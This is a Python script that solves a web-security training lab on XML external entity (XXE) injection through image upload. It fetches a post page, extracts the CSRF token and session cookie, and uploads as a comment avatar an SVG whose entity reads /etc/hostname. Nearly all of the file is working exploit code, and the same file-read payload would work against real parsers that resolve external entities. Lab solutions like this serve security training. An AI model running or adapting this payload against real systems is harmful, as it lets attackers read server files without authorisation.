######################################################################
#
# Lab: Exploiting XXE via image file upload
#
# Hack Steps:
#      1. Fetch a post page
#      2. Extract the csrf token and session cookie
#      3. Post a comment with the malicious SVG image
#      4. Check the uploaded image for the content of /etc/hostname
#      5. Submit the solution
#
######################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a8100b5036d665181e8ac9500a90083.web-security-academy.net" 

def main():
    print(Fore.WHITE + "â¦—1â¦˜ Fetching a post page.. ", end="", flush=True)

    post_page = fetch("/post?postId=1")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = post_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Posting a comment with the malicious SVG image.. ", end="", flush=True)
    
    svg_image = """<?xml version="1.0" standalone="yes"?>
                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
                    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
                        <text font-size="16" x="0" y="16">
                            &xxe;
                        </text>
                    </svg>"""
    svg_image_name = "image.svg" # You can change this to what you want
    files = { "avatar": (svg_image_name, svg_image, "image/svg+xml") }
    cookies = { "session": session }
    data = { "csrf": csrf_token, "postId": "1", "name": "no one", "comment": "no comment", "email": "no_one@hacker.com" }
    post_data("/post/comment", data, cookies, files)
     
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ Check " + Fore.GREEN + "/post/comment/avatars?filename=1.png" + Fore.WHITE + " for the content of /etc/hostname then submit the solution")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies, files):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, files=files, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()